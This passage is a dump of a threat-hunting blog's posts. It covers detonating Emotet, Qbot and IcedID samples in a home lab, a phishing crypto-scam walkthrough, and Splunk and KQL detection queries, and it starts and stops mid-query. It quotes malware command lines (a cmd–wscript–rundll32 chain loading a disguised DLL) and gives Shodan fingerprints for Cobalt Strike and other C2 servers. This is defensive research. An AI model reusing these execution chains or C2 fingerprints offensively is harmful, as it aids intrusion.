CommandLine, Image, ParentImage, ParentCommandLine, ProcessId | rename ProcessId as SourceProcessId, Image as SourceImage | join type=inner host SourceProcessId SourceImage [search index=sysmon AND (SourceImage= C:\\Windows\\System32\\regsvr32. exe  OR SourceImage= C:\\Windows\\SysWOW64\\regsvr32. exe ) EventCode=10 | table _time, host, SourceProcessId, SourceImage, TargetImage, TargetProcessId] | rename TargetProcessId as ProcessId, TargetImage as Image | join type=outer host ProcessId [search index=sysmon EventCode=3 NOT (DestinationIp= 10. 0. 0. 0/8  OR DestinationIp= 172. 16. 0. 0/12  OR DestinationIp= 192. 168. 0. 0/16 ) | table host ProcessId Image DestinationIp DestinationPort]This adds the outbound connection to the results too.  There are also options to hunt for the lateral movement seen, for example based on the service creation of the abnormal sort. Here is a short query for this using the System log. There are many many other ideas that come from this too but I need to leave something to you readers too. index=wineventlog EventCode=7045 Service_File_Name= *regsvr32. exe*  | table _time, host, Service_File_Name, Service_Name, SidClosing wordsThis was VERY interesting to do. I had a lot of fun while analyzing Qbot, however it was also quite stressful as I don’t really want the malware to escape my lab. I wouldn’t really recommend this type of analysis to anyone but it is heck of a fun. It is likely that I will continue to do these kind of posts in the future too, probably playing with recent samples that seem to have significant presence. I might also have a way to deploy MDE, which I might use in the future once more. One option would also be to ingest Sysmon data to my Log Analytics space as I am much much more familiar with KQL than SPL but we will see. Thanks for reading this far! "
    }, {
    "id": 37,
    "url": "https://threathunt.blog/my-version-of-a-home-lab/",
    "title": "My version of a home lab",
    "body": "2022/11/19 - This time I am going to introduced my version of a home lab. This is not as “pro” as many others have but have a good combination of lab and a home computer in a same package. The post does not contain instructions of how to mimic what I have, only a story of my own home lab. Little bit of history first. I have had some sort of home lab for as long as I remember. When I was building my first version I just used my gaming computer which I had at the time and used virtualization to boot up some virtual machines. That works fine still in my opinion, but since then I have liked the idea of having the home lab separated from the daily driver that I am using. The first version of the hypervisor that I bought for this purpose was a old HP workstation which had Xeon processor and quite a lot of memory. This was maybe 4-5 years ago. I installed Proxmox first on the thing, after which I moved to ESXi. This was working very nicely although the oldness of the CPU was showing up even if it had quite some cores.   I had a complete AD domain with 4-5 domain joined devices available there which was working very nicely for testing purposes. However, a year ago I wanted to buy a new desktop, mostly for gaming but of course it is also a daily driver when I am working on a computer at home. I was thinking if I could combine the daily driver and the lab to a single computer. I started to research my options. I knew that it is possible to pass through a GPU and an SSD to one virtual machine using almost any hypervisor available. However, I am starting to be a little lazy when it comes to infrastructure problem solving - I tend to prefer solutions that work well out of the box. From this perspective, I found a hypervisor known as Unraid. Unraid isn’t really only a hypervisor, actually I think that this feature was added much later to the product. The main function of Unraid is to act as a storage server, a NAS. However, it is also capable of acting as a hypervisor and also docker manager - which are the workloads that I needed. BTW, here are the specs for the machine:  MSI MEG x570 Unify AMD Ryzen 9 5950X 64GB DDR4 3200MHz CL16 (Thinking of doubling this now that the price is a little cheaper) 2* Corsair 1TB SSD M. 2 (Soon adding a third M. 2 SSD) 2* 500GB SSD sata (Model eludes me, these are older) Arctic Liquid Freezer II (AIO mostly cause I don’t like to have the heavy AIR cooler bolted to the motherboard, again just an issue my head and not a “real” issue) Fractal Design Meshify 2 Black Solid (To hide the stupid LEDs on the AIO) Nvidia GTX 1070 Ti (this is a little older, still works fine for my use)So why Unraid instead of Proxmox or ESXi? Well, the GPU and SSD passthrough feature to a Virtual Machine are made super easy in Unraid. It is also more of a consumer product so it is quite easy to use (not saying that the others wouldn’t be, they are in simple scenarios). So I chose to go with Unraid, even though I had to pay a license fee for it (I think it was 60 €). This was around a year ago. First, I installed my daily driver and it was very very easy to pass through all the things that I needed, including some of the USB ports for peripherals. It just worked. I had first installed Windows natively just to check the performance and that there are no issues with the new hardware and that benchmarks gave the expected results. As a VM I pinned half of the cores to the daily driver while the other half was left for virtualization purposes. The performance was as to be expected; half of the shown performance when I had Windows installed natively. I was expecting a bit of a performance loss from the virtualization layer but didn’t see any.  After I had my daily driver setup I started to migrate the lab over from the ESXi. This was very easy to do, there are ready-made tools which supported this migration nicely. Everything worked from this front well although I wasn’t really happy with the home lab as it wasn’t very automated. At this time, I hadn’t run any live malware on the system (or I had, but only offline so no network connectivity) so the network was very flat. I decided to change that while migrating and I created two Virtual LANs. One was for more “safe” environment where there were no malware being run and the other was for running the malware. I have a Ubiquiti router (EdgeRouter) which has quite nice features available. This router supports VLANs and also allows to configure firewall policies to block traffic between of them. So I used the router to create the VLANs, and I also blocked traffic from each VLAN to any other VLAN. I do have a management network from which I can connect to all the VLANs though. So now I had 2 VLANs (for this usage, I actually have 5 in total). I put the old lab to VLAN 2, which is the more safe VLAN with network connectivity to internet. Then on the VLAN 3 I started to install new things. There I had Windows VMs that I was using for testing purposes. I also wanted to use Defender for Endpoint for analyzing the live malware at some stage. So, I needed to have internet connectivity which is problematic as I don’t really want to route the potentially malicious traffic through my own ISP as they might not like that very much. I did not really fancy the idea of having a separate internet connection for this (although I would really recommend having a separate internet connection for this). How I decided to tackle this problem is by using a VPN. So, I basically started to route the traffic through a VPN for the machines that I was using for testing - which worked nicely. This way, the ISP should not be bothered and also my original IP is not revealed for the potential bad guys. If the VPN is not working, the traffic is sinkholed. BTW, Unraid works amazing with VLANs, you can choose the VLAN when giving an adapter to a VM and the VM doesn’t have to be aware. This setup was working quite nicely for running POC code, Malware and for example Atomic Red Team tests - the legitimate tests being run on the more “safe” side of the lab. There of course were issues like the malware analysis was done a standalone device without being in a domain. Also, I was running out all the trials for the MDE license and I haven’t found a way to buy a license for a cheap price as the standalone offering for MDE is not available from MS. I think the cheapest license which includes MDE is somewhere on the lines of ~40€ a month which is quite a lot for this use. So I wanted to have a new environment which would hopefully have a ready-made monitoring at least with endpoint data, domain and a domain joined windows device for testing purposes. I had known DetectionLab for some time now but hadn’t really used it myself. Though, I had only heard good things. DetectionLab is a repository which contains a bunch of scripts and tools which automate the process of deploying a test / detection environment. The tools include Packer, Vagrant, PowerShell, Ansible and Terraform. Some of these I know, some I don’t but fortunately this repository supports my laziness to deal with infrastructure - it is well documented and automated. This was built for Virtualbox and VMware workstation/fusion first, but the nice people have since created instructions for some hypervisors/cloud too: HyperV, ESXi, AWS, Azure. There is also some help provided for LibVirt and Proxmox but not official support. My first instinct was of course to go with LibVirt but the instructions aren’t amazing for it. So this was a little disappointing and I was thinking how to solve this thing. Two options; go with other hypervisor or tinker with LibVirt. I decided to go with other hypervisor but I didn’t want to get rid of Unraid so here comes the nested virtualization (probably a bad idea, but lazy people do weird things). I enabled the nesting with Unraid and then installed ESXi on top of Unraid and allocated resources to it. After configuring everything as instructed in DetectionLab instructions I launched another VM (Ubuntu server) which I used to launch the actual deployment towards the ESXi. After this, I have to say, everything went super smoothly! I had the ESXi hosted in the VLAN 3. At this stage I also configured the network so that ALL the network traffic is routed through a VPN from this VLAN. Before this, only part of the traffic was (selected hosts). This of course meant that I can’t access the network from management network anymore as packets are routed to the wrong address. This I am currently solving, but can work around the issue already. Now I had a great environment from DetectionLab where I have sysmon, Powershell transaction logging, other EVTX logging, Splunk + Velociraptor amongst other things on which I can also run malware if I want to. Also, ESXi supports snapshots which makes recovering much easier when the testing has been done - this was a little painful with Unraid although doable. This has so far worked VERY nicely and also I like that I can at any given moment redeploy the whole DetectionLab with ease. I also do know that this is NOT the most secure way of doing things, it would be much more secure to have a completely different box for testing with it’s own internet connection. However, I don’t fancy any extra computers in my home eating up electricity and I do like to have multipurpose for the fairly expensive desktop that I bought. I highly recommend this sort of setup for anyone interested in testing. If not willing to play around the network related things, at least take a look at DetectionLab if you are interested in building a home lab for detection purposes. It is amazing and makes at least my life a lot easier. It saves a lot of time as you don’t have to configure everything yourself, simply deploy the things using the ready-made repo. You can also add further components yourself. My experiences from this setup have been very positive. The Unraid itself is stable and the only issues that I’ve encountered are more to do with me living in the countrier side where there are power cuts occasionally (I don’t have an UPS, at least yet). The Unraid itself have been stable and I’ve been able to do all the things that I wish for the home lab with relative ease. The setup allows me to run a single quite powerful desktop and have several workloads on top of it, getting more out of the expensive hardware. The daily driver has worked very well for my use case. The performance is great and if you do not know that you are running a virtual machine you can’t really tell from the user experience. Of course, there have been some challenges in my road which are added below. Issues encountered so far:  Some anticheats do check for virtual machines and kick you out if you are gaming on a VM. I am sure that this could be worked around by spoofing the fact that it is a VM but I have not bothered - I just do not play the games that don’t work when running from a VM.  Detection Lab was discussed already but it showed well that if not using the most mainstream hypervisors some things can be more painfulA little different subject this time, hopefully enjoyable to some. I got the idea for the post from my Podcast partner in crime, so thanks for you Juuso for pitching the idea to me! "
    }, {
    "id": 38,
    "url": "https://threathunt.blog/recent-phishing-emails-emotet-recent-sample-analysis/",
    "title": "Recent phishing emails + Emotet recent sample analysis",
    "body": "2022/11/13 - Phishing emailsIt’s been a little quiet on the blog for a while now. I’ve been busy with other things and haven’t had the time to find any feasible topics to write about. Now it sort of landed to my lap. I’ve been receiving phishing messages for a ~week now to my personal mailbox. The messages are coming from ‘Google Notifications’ or gmail addresses and they contain a link to a domain “script. google. com”, mostly. Seems like this really isn’t anything new while googling for it, as there is a an article from Kaspersky detailing this. Nevertheless this is new to me and especially active currently. So here is one of the messages that I’ve received.  The headers verified that this is from Gmail, but I don’t add the header here as it is a little bit boring. Some of the similar emails came from actual gmail addresses too, this one was the notify thing. I have no idea how that notification is generated and didn’t bother to google more about it. I am, however, very much interested in what happens if I access these links. Some of the mails actually included an attachment too so that of course is interesting too. This time, I am going to use Detection Labs instead of MDE. Detection Lab is ready made collection of easily deployable virtual machines that are automatically installed with monitoring tools like Sysmon which are then gathered to Splunk. This is made to deploy a testing environment easily which can be, for example, used to rule development within SOC. The Detection Lab is available here. I’ll browsed to the first URL and was welcomed with a CAPTCHA. Then, the browser was redirected to another site, https://bonusbtc[. ]online/offbitbonus_1120/?u=4403&amp;s=44#5d8ymdgg8e9aogu4i4dy6646769fvrls. This was already picked up by Chrome as deceptive.   I browsed to the site still and was welcomed with the following view: Clicking next couple of times and the site is finally requesting for me to log in to an account.  Of course, I have no idea which account this would be. The next screen likely though reveals the mystery as there is the “Login with Google” button, and also the “credentials” are already present on the logon screen.  When logging in it actually does “work”. So you actually get somewhere, my assumption was that the site would announce that the password is not working and would force to login with google and then steal your credentials but seems not to be the case. Well, while I am “logged” to the site I was browsing around to see what happens next. This led me finally to a “chat” as I tried to withdraw the funds. In reality, there were just some premade answers from which I had to choose, probably always leading to same output.                      Next, this returned to the chat and I had to “convert the currency” through and pay 0. 00381228 BTC to finalize the transaction. This was using a service called MoonPay. com. I am not very knowledgeable of Bitcoin world so I have no idea how legit this service is, but the actual payment itself looks quite legitimate. Unfortunately, It seems that this is very boring, basically scamming money from the recipients. I was hoping for something more elaborate but meh. I also checked the PDF attachment that I’ve received and all of them point out to the same thing so this was just super boring. Analyzing the device with the sysmon data doesn’t show much anything happening. I did check couple of other messages that I’ve received and one was pointing to google forms: https://forms[. ]gle/2Fb1augjpPFJDGMa6#wse6qe0vda21ar8il8. This asked details like email address, name etc. After filling with garbage, the form pointed to a link: The link then pointed to the same malicious domain, bonusbtc[. ]online. Nothing special really, just another way to try to fool the people. Emotet - the second comingEmotet has been fairly active recently and I decided to grab a sample of it in and run it in the lab. Looking at the recent reports in tria. ge, there is no shortage of emotet samples. I decided to grab one amongst the all. Why this? Well, it was an excel file and not only the dll, makes it much more easy to analyze. The excel had the macros enabled as per usual with Emotet. The articles stating the second coming of it have stated that it is using the old tricks so this was to be expected. Also, as to be expected, it creates a DLL file, or actually several DLL files which it then loads with regsvr32. exe.  The DLL files are created at least partly by the regsvr32. exe process, which could be potentially used within threat hunting, maybe joined to some other event too. I would assume that regsvr32. exe doesn’t actually create files in c:\windows\system32\ that often legitimately. The sample also connects to 53 distinct IP-addresses, mostly on port 8080. It is possible that not all of this traffic is to malicious servers though, most of it seem to be.  The persistence is handled by runkeys. This sample creates a new key which then launches the malicious DLL using regsvr32. exe. This is also great for threat hunting purposes although it goes very much back to the basics.  The sample also drops different exe files. All of the files are randomly named and are created in the users temp folder: c:\users\username\AppData\Local\Temp\. The filenames dropped by this sample were utdfnjnpqkecvxvn. exe, oialmuujnim. exe, fwbm. exe and zbtkqcoguhdnmjk. exe. These were all removed after created.   The sample also launched systeminfo and ipconfig /all commands to learn more about the device. So that’s that. Now it seems to be idling and calling home from time to time, but I don’t like to keep the environment exposed too long even if it has been completely isolated from everything else that I have. Then to the threat hunting queries. The simple ones first, I’ll add couple of them to the same code block. Not the best with SPL so these queries are a little basic.  The first one looks for regsvr32. exe process creating files to the C:\windows\system32\ -folder.  The second one looks for exe file creation to the c:\users\ folder Connection towards public IP-addresses from regsvr32. exe   The last one joins dll creation by the regsvr32. exe to a network connection event towards public IP-addresses with a inner join. Could also maybe include the exe creation, but the idea of this is simple and potentially maybe works fine. Could also be made more strict by joining to dll creations to c:\windows\system32\  but in my opinion that makes it a little limited.   —- Query 1 —-index=sysmon Image=”C:\Windows\System32\regsvr32. exe” EventCode=11 TargetFilename=”C:\Windows\System32\*”   —- Query 2 —-index=sysmon Image=”C:\Windows\System32\regsvr32. exe” EventCode=11 TargetFilename=”. exe” TargetFilename=C:\Users\   —- Query 3 —-index=sysmon Image=”C:\Windows\System32\regsvr32. exe” EventCode=3 NOT (DestinationIp=”10. 0. 0. 0/8” OR DestinationIp=”172. 16. 0. 0/12” OR DestinationIp=”192. 168. 0. 0/16”) | table _time, host, EventCode, Image, ProcessId, DestinationPort, DestinationIp   —- Query 4 —-index=sysmon Image=”C:\Windows\System32\regsvr32. exe” EventCode=11 TargetFilename=”*. dll” | table _time User ComputerName Image ProcessId ProcessGuid TargetFileName | join type=inner ComputerName ProcessId ProcessGuid [search index=sysmon Image=”C:\Windows\System32\regsvr32. exe” EventCode=3 NOT (DestinationIp=”10. 0. 0. 0/8” OR DestinationIp=”172. 16. 0. 0/12” OR DestinationIp=”192. 168. 0. 0/16”) | table _time, ComputerName, Image, ProcessId, ProcessGuid, DestinationPort, DestinationIp]  And that’s it for now. The queries can also be found from Github: https://github. com/JouniMi/Threathunt. blog/blob/main/emotet_queries. Cheers to reading to this stage. I am hoping to be a little more active with the blog in the future - but no promises! "
    }, {
    "id": 39,
    "url": "https://threathunt.blog/from-shodan-to-mde-queries/",
    "title": "From Shodan to MDE queries",
    "body": "2022/09/04 - I’ve had an idea for some time for using the Shodan and MDE API:s. The idea is to pull recently identified C2 servers from Shodan and use the IP-addresses to run a query against the MDE API. This could then be automated to be ran on a daily basis, for example. As I didn’t want to use too much time on developing this thing, I used code made by others. Also, I am not very skilled in Python so there are likely many things that could be done much more efficiently, or better. The solution is pictured in the following diagram.  Starting with Shodan, I stumbled upon an article containing queries to hunt for certain type of C2 server. This included Cobalt Strike, Posh, Deimos and Empire. Some of the queries are very noisy so I only picked the ones that are stated to be non FP sensitive. The queries are available here: https://cyberwarzone. com/shodan-queries-list-for-threat-hunters-2022/. Starting the Python script by the required imports (which should be installed with pip if missing): shodan, pandas, json, urllib, datetime. Then, setting the Pandas Dataframe show options so that all the data is shown, however with the current version the data is actually saved to a JSON file. Showing it in a table format is nice with Jupyter  which I often use and thus I tend to go for PD approach, even when not exactly needed. The second part is important. The API key for Shodan and Defender for Endpoint are added here. MDE requires you to create your own API key, instructions are here: https://docs. microsoft. com/en-us/microsoft-365/security/defender-endpoint/exposed-apis-create-app-webapp?view=o365-worldwide. Remember, you need to add API permissions to run “read” advanced hunt which is not stated in the instructions. With, Shodan, the API key can be seen under the account settings. # API_keys# These are a must to have for the script to work. #Define Shodan, authenticate with the API keyshodanapi = Shodan('your_shodan_api_key')#Defender API keysClient_id =  your_client_ID Client_secret =  your_client_secret TenantId =  your_tenant_id The script is built using the shodan-python, which allows for easy access to the Shodan API  with Python. I created a function which allows for running any query from Shodan, dropping results dating back more than 7 days. The API results only the latest page, so basically the 100 newest results. This only goes through the latest page. It wouldn’t be hard to go through the pages but it would add quite a lot of addresses to look with the Defender API. Also, my Shodan API calls are fairly limited, so I didn’t want to add the overhead. After querying Shodan for the information the script will add the addresses in a format that can be passed to a query that is then sent to Defender API. def run_shodan_query_return_IP_filter(query):  try:    data = shodanapi. search(query)    QueryFilter =  (     for a in data['matches']:      # Set the format for the timestamp      format =  %Y-%m-%dT%H:%M:%S. %f       #Change the string format of the timestamp as datetime format      IPDateTime = datetime. datetime. strptime(a['timestamp'],format)      #Only return results where the IP address was detected less than 7 days ago      if IPDateTime &gt; datetime. datetime. now() - timedelta(7):        QueryFilter = QueryFilter +  '  + a['ip_str'] +  ',     l = len(QueryFilter)    QueryFilter = QueryFilter[:l-1]    QueryFilter = QueryFilter +  )     if QueryFilter =  ) :      print( No results for the query :   + query)      QueryFilter =       return QueryFilter  except Exception as e:    print('Error: %s' % e)Then, I added the queries I’d like to run in a dict. As you can see, the MDE queries are stated within the dict. This is the part you need to modify when adding your own queries. #Add the filters to a dictqueries = {  'CobaltStrikeJARMfilter': f'DeviceNetworkEvents | where Timestamp &gt; ago(30d) | where RemoteIP in {run_shodan_query_return_IP_filter( ssl. jarm:07d14d16d21d21d00042d41d00041de5fb3038104f457d92ba02e9311512c2 )}',  'CobaltStrikeProductName': f'DeviceNetworkEvents | where Timestamp &gt; ago(30d) | where RemoteIP in {run_shodan_query_return_IP_filter(   product: Cobalt Strike Beacon     )}',  'PoshC2': f'DeviceNetworkEvents | where Timestamp &gt; ago(30d) | where RemoteIP in {run_shodan_query_return_IP_filter(   ssl: P18055077     )}',  'EmpireC2': f'DeviceNetworkEvents | where Timestamp &gt; ago(30d) | where RemoteIP in {run_shodan_query_return_IP_filter(   product: Empire C2     )}',  'DeimosC2': f'DeviceNetworkEvents | where Timestamp &gt; ago(30d) | where RemoteIP in {run_shodan_query_return_IP_filter( http. html_hash:-14029177 )}'}The MDE authentication is handled by scripts created by Microsoft, available here: https://github. com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Notebooks/M365D%20APIs%20ep3. ipynb. No need to redo something that is already working, in my opinion. I won’t describe that part much more in this post. Next, is the actual code which is running the queries against the Defender API and return the results as json files. The query will loop through the keys in the queries dict and as the query itself is stored as a value that will be used to run the actual query. The key name will be used as the name of the JSON file and it will be saved to the current working directory. #Run the queries stored in the queries dict, one by one. for a in queries:  if queries[a]. endswith( ) ):    df = exec_mtp_query(queries[a],aadToken)    if df. empty == False:      #write the results to a json file in the working directory.       filename = a+ . json       jsonfile=df. to_json(orient= split )      with open(filename,'w') as f:        f. write(jsonfile)        f. close()This is pretty much it. It seems to work as intended although no results were found from my testing environment. This is very simple script which needs some tinkering to be more “production ready”. However, as a quick and dirty script to look for recently popped up C2 servers it works nicely. With better error-handling and using some sort of password manager solution to store the secrets this could be made much more elaborate. Also, the Shodan queries are to be taken as more of an example. I have no idea how efficient these actually are in finding true-positive C2 servers. The script is available here: https://github. com/JouniMi/Threathunt. blog/blob/main/shodan_to_mde. py "
    }, {
    "id": 40,
    "url": "https://threathunt.blog/running-live-malware-for-threat-hunting-purposes/",
    "title": "Running live malware for threat hunting purposes",
    "body": "2022/08/13 - This time I am trying something different. I am in no way, shape or form capable in malware analysis but I was thinking if it could be useful to run a live malware on a device with MDE agent installed. This could potentially provide great telemetry data to generate ideas for threat hunting purposes. In this instance, I just wanted to pick up a random malicious ISO file and stumbled upon this: This seems to be potentially IcedID loader which would be great for the example I guess. So I downloaded the sample, moved it to the lab and double clicked to open the file. The contents of the file were pretty much expected, an LNK file with everything else being hidden: This shortcut then pointed to a script under AT folder stored on the same ISO file. The first script is executed with the following command line: ‘cmd. exe /c ““F:\at\thenWaySomeManyThem. bat” “‘. Then, it continues to execute malicious javascript file with the following command: ‘“WScript. exe” “F:\at\himCanBeTwoGive. js” ru123ndll12332123’. Even by looking only at the command line, it is quite easy to see what is the next step, running something with rundll32. exe: ‘rundll32. exe” at/veryIntoAlsoTimeI. txt,#1’. Then, the rundll32. exe connect to a public IP address, likely trying to download additional code. When looking at the contents, these files are of course present on the ISO file, but malware analysis is not really the point of this blog post so I am not going to dwell deeper to that. Process tree of the malware launch So this example is super simple. All four steps here can be added to a advanced hunting query very simply. First things first, I’ll create query target the process start events, with having all three processes intact. DeviceProcessEvents| where FileName =~  rundll32. exe | where InitiatingProcessFileName =~  wscript. exe | where InitiatingProcessParentFileName =~  cmd. exe | project Timestamp,DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileNameEasy. Now, adding the network connection requires a simple join, only thing adding a little complexity is that the join has to be made with the rundll32. exe process, so this requires renaming the fields (or dropping off the grandparent process from the first part of the query). DeviceProcessEvents| where FileName =~  rundll32. exe | where InitiatingProcessFileName =~  wscript. exe | where InitiatingProcessParentFileName =~  cmd. exe | project Timestamp,DeviceName, InvestigatedProcessName=FileName, InvestigatedProcessCommandLine = ProcessCommandLine,InvestigatedProcessStartTime = ProcessCreationTime, InvestigatedProcessId = ProcessId, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName| join (DeviceNetworkEvents| where InitiatingProcessFileName =~  rundll32. exe | where RemoteIPType ==  Public | project DeviceName, InvestigatedProcessName=InitiatingProcessFileName, InvestigatedProcessCommandLine = InitiatingProcessCommandLine,InvestigatedProcessStartTime = InitiatingProcessCreationTime, InvestigatedProcessId = InitiatingProcessId, RemoteIP, RemoteUrl) on DeviceName, InvestigatedProcessCommandLine, InvestigatedProcessId, InvestigatedProcessName, InvestigatedProcessStartTime| project-away DeviceName1, InvestigatedProcessCommandLine1, InvestigatedProcessId1, InvestigatedProcessName1, InvestigatedProcessStartTime1This should work, but unfortunately when I executed the malware the events did not end up to advanced hunt. They were present on the timeline but not in the advanced hunt, which was likely cause by the license that I had active at the time. Unfortunately, I didn’t realize that the license which I had did not enable the full blown MDE events. When I changed the license and ran the malware again, it did not initiate the network connection. The next query adds less restricted filters to the process events. This should make the query a little more universal. DeviceProcessEvents| where FileName has_any ( rundll32. exe , regsvr32. exe )| where InitiatingProcessFileName has_any ( wscript. exe , powershell. exe , cmd. exe , pwsh. exe )| project Timestamp,DeviceName, InvestigatedProcessName=FileName, InvestigatedProcessCommandLine = ProcessCommandLine,InvestigatedProcessStartTime = ProcessCreationTime, InvestigatedProcessId = ProcessId, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName| join (DeviceNetworkEvents| where InitiatingProcessFileName has_any ( rundll32. exe , regsvr32. exe )| where RemoteIPType ==  Public | project DeviceName, InvestigatedProcessName=InitiatingProcessFileName, InvestigatedProcessCommandLine = InitiatingProcessCommandLine,InvestigatedProcessStartTime = InitiatingProcessCreationTime, InvestigatedProcessId = InitiatingProcessId, RemoteIP, RemoteUrl) on DeviceName, InvestigatedProcessCommandLine, InvestigatedProcessId, InvestigatedProcessName, InvestigatedProcessStartTime| project-away DeviceName1, InvestigatedProcessCommandLine1, InvestigatedProcessId1, InvestigatedProcessName1, InvestigatedProcessStartTime1And at this stage I really just wanted to verify that the logic works so I rolled back the virtual machine, launched the same malware once more and was able to verify that the queries catches this particular malware. The query results. Aaand it seems to work as I intended to. Of course this is still super targeted. One idea to catch this kind of malware would be to look for image loads where the extension is something else than . dll. This can be then joined to the network events similarly to the previous query. DeviceImageLoadEvents | where InitiatingProcessFileName has_any ( rundll32. exe , regsvr32. exe )| where FileName !endswith  . dll | join (DeviceNetworkEvents| where InitiatingProcessFileName has_any ( rundll32. exe , regsvr32. exe )| where RemoteIPType ==  Public ) on InitiatingProcessFileName, InitiatingProcessId, InitiatingProcessCreationTime, InitiatingProcessCommandLine| project Timestamp, DeviceName, FileName, FolderPath, SHA1, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort, InitiatingProcessParentFileNameThis also seems to be working fine and could catch things that are not caught with the first queries. The idea of this blog post was not really to continue the subject from the previous one, but apparently it partly did. I did like the idea of running live malware and then analyzing how that could be caught with the advanced hunt queries and will likely revisit this in the future blogs too. Also, I finally added Github repository for storing the queries. I have no metadata there and likely never will have, as the queries are explained in this blog. They are there so it is easier to copy them than from the actual blog post. The repository is available here: https://github. com/JouniMi/Threathunt. blog/tree/main Github link to queries in this post: https://github. com/JouniMi/Threathunt. blog/blob/main/live_mw_for_hunting_purposes "
    }, {
    "id": 41,
    "url": "https://threathunt.blog/detecting-a-payload-delivered-with-iso-files-using-mde/",
    "title": "Detecting a Payload delivered with ISO files with MDE",
    "body": "2022/07/17 - It’s been a little quiet on my blog for a while now - reason being that I was on a holiday and rather did other things than sit in front of a computer. Just got back and have some free time to keep on blogging. While I was on a vacation I read an article that Microsoft reverted the change to the disabling macros on documents originating from the internet and once again allows the macros by default. This is interesting as the threat actors had been changing to the ISO files already. It is interesting to see what  happens before the macros will be systematically disabled once more. It seems that the threat actors have adapted well to the ISO file based approach and there are quite a few examples of this activity. It is likely that the threat actors continue to utilize both attack vectors as long as they are available. One of the great examples of the threat actors using ISO files is the rather new write-up by the Palo Alto Unit 42 of the Brute Ratel attack framework. The Brute Ratel payload has been deliverer on an ISO file where there was a legitimate binary which then loaded malicious DLL image stored on the same file. Another way that I’ve seen the malicious payload being launched has been that the LNK file stored in the ISO has started CMD. EXE which then loaded a malicious DLL file from the ISO file using either regsvr32. exe or rundll32. exe. The ISO files work so that the users have to open them first. When the file is opened it will be mounted as a drive to Windows operating system. First queries that I’ve created to  detect this were just filtering out everything starting with the letter C, but this approach is prone to noise. I started to investigate for a better way to detect this and I was thinking that there would be a registry entry saved to MDE which then would reveal the drive letter to which the ISO was mounted to, but this seems not to be the case. However there is a BrowserLaunchedToOpenUrl event recorded in the DeviceEvents table when a LNK file is executed. This is not really what I was looking for but could still be helpful to detect potentially malicious LNK files being started. Unfortunately, this offers no way to detect the system drive - I am sure that this could be achieved but the ways that comes to my mind currently would require for additional joins which then would cause more overhead to the query so I am leaving that part out. Here is the query for getting the LNK related BrowserLaunchedToOpenUrl events, limiting to events where LNK files are being executed and leaving out anything starting with C:. At the end of the query, the drive letter is parsed to it’s own column and then everything where there is no drive letter is left out (it’s not always recorded). This is a good basis for further queries.   DeviceEvents | where ActionType == 'BrowserLaunchedToOpenUrl' | where RemoteUrl endswith  . lnk | where RemoteUrl !startswith  C: | project Timestamp, DeviceName, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl| parse RemoteUrl with Drive '\\' *| extend Drive = tostring(Drive)| where isnotempty(Drive)The next query uses the first one as basis. Basically, I take the first query and join it to the DeviceImageLoads table from where I have removed all the DLL files that are being loaded from the C: drive. Again, there would probably maybe be a better way to do this so that the actual system drive is filtered out instead of the the C: drive, but my crude version does still work. The data is joined using the DeviceName and Drive column values. The Drive column is the parsed Drive letter from which the LNK file was launched. DeviceEvents | where ActionType == ‘BrowserLaunchedToOpenUrl’ | where RemoteUrl endswith “. lnk”| where RemoteUrl !startswith “C:”| project LNKLaunchTimestamp = Timestamp, DeviceName, RemoteUrl| parse RemoteUrl with Drive ‘\\’ *| extend Drive= tostring(Drive)| where isnotempty(Drive)| join (DeviceImageLoadEvents| where FolderPath !startswith “C:”| parse FolderPath with Drive ‘\\’ *| project Drive= tostring(Drive), ImageLoadTimestamp = Timestamp, LoadedImageName = FileName, LoadedImageSHA1 = SHA1, LoadedImagePath = FolderPath, DeviceName, ImageLoadProcessName = InitiatingProcessFileName, ImageLoadProcessCmdline = InitiatingProcessCommandLine, ImageLoadProcessFolderPath = InitiatingProcessFolderPath, ImageLoadProcessParent = InitiatingProcessParentFileName) on DeviceName, Drive| where ImageLoadTimestamp between (LNKLaunchTimestamp . . (LNKLaunchTimestamp+1m))| project-away Drive1, DeviceName1| project-reorder LNKLaunchTimestamp, ImageLoadTimestamp, DeviceName, RemoteUrl, Drive, LoadedImageName, LoadedImageSHA1, LoadedImagePath, ImageLoadProcessName, ImageLoadProcessCmdline, ImageLoadProcessFolderPath, ImageLoadProcessParent I did also add a filter where the image load timestamp should be at maximum one minute after the LNK file has been opened. This query might be too noisy in some environments and it might cause it be impossible to run, however it seems to work nicely in my testing environment. I created an ISO file where there is an LNK file named SuperLegit. Lnk. This file launches cmd. exe which then launches regsvr32. dll and launch a DLL file named calc. dll from the same ISO file. The query shown catches this very  nicely. Query showing the loaded DLL nicely. Next, I started to create a query to account for a process being launched from the ISO file. The query follows the same logic, however instead of looking for DLL loads I am chasing process starts. I created a secondary ISO file which had cmd. exe (a legitimate cmd. exe copied to the ISO file), calc. dll and the LNK file starting these in the root. The LNK launched the cmd. exe which then launch the regsvr32. exe and load the calc. dll file from the ISO. This was of course found with the image load based query, however I created the second query if there would be a case where there is no DLL being loaded from the ISO image. DeviceEvents | where ActionType == ‘BrowserLaunchedToOpenUrl’ | where RemoteUrl endswith “. lnk”| where RemoteUrl !startswith “C:”| project LNKLaunchTimestamp = Timestamp, DeviceName, RemoteUrl| parse RemoteUrl with Drive ‘\\’ *| extend Drive= tostring(Drive)| where isnotempty(Drive)| join (DeviceProcessEvents| where FolderPath !startswith “C:”| parse FolderPath with Drive ‘\\’ *| project Drive= tostring(Drive), StartedProcessTimestamp = Timestamp, StartedProcessName = FileName, StartedProcessSHA1 = SHA1, StartedProcessCommandline = ProcessCommandLine, StartedProcessPath = FolderPath, DeviceName, StartedProcessParentName = InitiatingProcessFileName, StartedProcessParentCmdline = InitiatingProcessCommandLine, StartedParentProcessFolderPath = InitiatingProcessFolderPath, StartedProcessGrandParent = InitiatingProcessParentFileName, Timestamp) on DeviceName, Drive| where StartedProcessTimestamp between (LNKLaunchTimestamp . . (LNKLaunchTimestamp+1m))| project-away Drive1, DeviceName1| project-reorder LNKLaunchTimestamp, StartedProcessTimestamp, DeviceName, RemoteUrl, Drive, StartedProcessName, StartedProcessSHA1, StartedProcessPath,StartedProcessCommandline, StartedProcessParentName, StartedProcessParentCmdline, 